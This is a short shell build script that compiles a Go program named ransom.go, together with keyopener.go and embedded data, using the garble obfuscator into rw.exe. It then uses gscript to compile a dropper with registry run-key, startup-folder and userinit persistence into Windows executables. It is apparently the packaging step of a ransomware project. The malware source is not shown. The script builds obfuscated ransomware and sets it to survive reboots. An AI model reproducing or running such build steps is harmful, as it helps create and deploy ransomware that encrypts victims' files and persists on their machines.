#!/usr/bin/env sh

rm *_gscript.exe
go-bindata data
mv bindata.go itself
cd itself
garble build ransom.go bindata.go keyopener.go
mv ransom.exe ../rw.exe
cd ..
gscript compile drop.gs runkey_persistence.gs startup_persistence.gs userinit_persistence.gs;
mv $TEMP/*_gscript.exe .